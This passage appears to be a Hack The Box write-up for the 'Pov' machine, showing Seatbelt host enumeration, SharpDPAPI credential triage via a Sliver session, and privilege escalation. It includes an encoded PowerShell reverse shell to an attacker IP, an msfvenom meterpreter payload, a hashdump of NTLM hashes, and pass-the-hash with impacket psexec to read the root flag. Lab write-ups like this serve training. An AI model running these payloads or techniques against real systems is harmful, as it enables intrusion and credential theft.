  FileDescription                : VMware Guest Authentication Service
  Version                        : 12.3.0.1838
  IsDotNet                       : False

  Name                           : vm3dservice
  DisplayName                    : VMware SVGA Helper Service
  Description                    : Helps VMware SVGA driver by collecting and conveying user mode information
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : C:\Windows\system32\vm3dservice.exe
  BinaryPath                     : C:\Windows\system32\vm3dservice.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;FA;;;SY)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware SVGA Helper Service
  Version                        : 9.17.06.0003
  IsDotNet                       : False

  Name                           : VMTools
  DisplayName                    : VMware Tools
  Description                    : Provides support for synchronizing objects between the host and guest operating systems.
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 12.3.0.44994
  IsDotNet                       : False

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:80             0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:135            0.0.0.0:0              LISTEN     864   RpcSs           C:\Windows\system32\svchost.exe -k RPCSS -p
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     488                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     932   EventLog        C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1376  Schedule        C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
  0.0.0.0:49667          0.0.0.0:0              LISTEN     616                   services.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     624                   C:\Windows\system32\lsass.exe
  10.129.248.9:139       0.0.0.0:0              LISTEN     4                     System
  10.129.248.9:49675     10.10.16.34:443        ESTAB      3628                  powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
  10.129.248.9:49677     10.10.16.34:6969       ESTAB      1556                  
  10.129.248.9:49679     10.10.16.34:8888       ESTAB      3048                  "C:\temp\foobar.exe"
====== TokenPrivileges ======

Current Token's Privileges

                             SeDebugPrivilege:  SE_PRIVILEGE_ENABLED
                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
====== UAC ======

  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
  EnableLUA (Is UAC enabled?)    : 0
  LocalAccountTokenFilterPolicy  : 
  FilterAdministratorToken       : 
    [*] UAC is disabled.
    [*] Any administrative local account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            2628   W32Time                 C:\Windows\system32\svchost.exe -k LocalService -s W32Time
  0.0.0.0:5353           1424   Dnscache                C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
  0.0.0.0:5355           1424   Dnscache                C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
  10.129.248.9:137       4                              System
  10.129.248.9:138       4                              System
  127.0.0.1:65454        2312   iphlpsvc                C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at Seatbelt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at Seatbelt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : 
  DefaultUserName                : 
  DefaultPassword                : 
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 

====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : ALLOW
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block 135
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :135

====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,26,1,3,2,2
  BootupState                   : Normal boot
  Caption                       : POV
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -480
  DaylightInEffect              : False
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : pov
  Domain                        : WORKGROUP
  DomainRole                    : 2
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : POV
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 2
  NumberOfProcessors            : 2
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : False
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      NT
      Server_NT
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 4293931008
  WakeUpType                    : 6
  Workgroup                     : WORKGROUP

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :   
  MaximumQueueSize                  :   
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :   
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :   
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    : 
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 2.129 seconds
```

```c
[server] sliver (UNLIKELY_BAIT) > sharpdpapi triage

[*] sharpdpapi output:

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.3                               


[*] Action: User DPAPI Credential and Vault Triage

[*] Triaging Credentials for current user


Folder       : C:\Users\alaading\AppData\Local\Microsoft\Credentials\

  CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D

    guidMasterKey    : {5669897a-1e01-4376-85fc-f94ec1438fe6}
    size             : 11104
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {5669897a-1e01-4376-85fc-f94ec1438fe6}


[*] Triaging Vaults for the current user


[*] Triaging Vault folder: C:\Users\alaading\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {5669897a-1e01-4376-85fc-f94ec1438fe6}
    size             : 324
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : 
    [X] MasterKey GUID not in cache: {5669897a-1e01-4376-85fc-f94ec1438fe6}


[*] Triaging RDCMan Settings Files for current user

[*] Triaging KeePass ProtectedUserKey.bin files for current user


Folder       : C:\Users\alaading\AppData\Roaming\Microsoft\Crypto\Keys\

    [!] de7cf8a7901d2ad13e5c67c29e5d1662_152a04ea-b02e-4546-8fa0-51d0847561ab masterkey needed: {5669897a-1e01-4376-85fc-f94ec1438fe6}


SharpDPAPI completed in 00:00:00.0478959
```

## Privilege Escalation

> https://www.elastic.co/guide/en/security/current/sedebugprivilege-enabled-by-a-suspicious-process.html

```c
┌──(user㉿kali)-[/media/…/htb/machines/pov/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.34 LPORT=6669 -f exe -o a.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: a.exe
```

```c
PS C:\temp> .\a.exe
.\a.exe
```

```c
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7<--- SNIP --->9b:::
alaading:1001:aad3b435b51404eeaad3b435b51404ee:31c0583909b8349cbe92961f9dfa5dbf:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sfitz:1000:aad3b435b51404eeaad3b435b51404ee:012e5ed95e8745ea5180f81648b6ec94:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:1fa5b00b7c6cc4ac2807c4d5b3dd3dab:::
```

> https://github.com/0xJs/RedTeaming_CheatSheet/blob/main/windows-ad/Lateral-Movement.md

> https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries

```c
┌──(user㉿kali)-[/media/…/htb/machines/pov/serve]
└─$ wget https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe
--2024-01-27 21:50:47--  https://github.com/ropnop/impacket_static_binaries/releases/download/0.9.22.dev-binaries/psexec_windows.exe
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/164776156/6d1ba000-2515-11eb-9831-3d781f46c11b?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240127%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240127T214813Z&X-Amz-Expires=300&X-Amz-Signature=b4e8fbcfb15b891f9f8b2e41bba0193c71a97c15104c9cd62a8b96b83203d3e8&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=164776156&response-content-disposition=attachment%3B%20filename%3Dpsexec_windows.exe&response-content-type=application%2Foctet-stream [following]
--2024-01-27 21:50:47--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/164776156/6d1ba000-2515-11eb-9831-3d781f46c11b?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240127%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240127T214813Z&X-Amz-Expires=300&X-Amz-Signature=b4e8fbcfb15b891f9f8b2e41bba0193c71a97c15104c9cd62a8b96b83203d3e8&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=164776156&response-content-disposition=attachment%3B%20filename%3Dpsexec_windows.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9934365 (9.5M) [application/octet-stream]
Saving to: ‘psexec_windows.exe’

psexec_windows.exe                                         100%[========================================================================================================================================>]   9.47M  6.85MB/s    in 1.4s    

2024-01-27 21:50:50 (6.85 MB/s) - ‘psexec_windows.exe’ saved [9934365/9934365]
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/pov/serve]
└─$ mv psexec_windows.exe ps.exe
```

```c
PS C:\temp> iwr http://10.10.16.34/ps.exe -o ps.exe
```

```c
PS C:\temp> .\ps.exe -hashes :f7<--- SNIP --->9b administrator@127.0.0.1 "cmd /c type C:\Users\Administrator\Desktop\root.txt"
Cannot determine Impacket version. If running from source you should at least run "python setup.py egg_info"
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 127.0.0.1.....
[*] Found writable share ADMIN$
[*] Uploading file wRfBLJKT.exe
[*] Opening SVCManager on 127.0.0.1.....
[*] Creating service Kckz on 127.0.0.1.....
[*] Starting service Kckz.....
[!] Press help for extra shell commands
45396c82c834e00a121a4c900992ab02

[*] Process cmd /c type C:\Users\Administrator\Desktop\root.txt finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 127.0.0.1.....
[*] Stopping service Kckz.....
[*] Removing service Kckz.....
[*] Removing file wRfBLJKT.exe.....
```

## root.txt

```c
45396c82c834e00a121a4c900992ab02
```
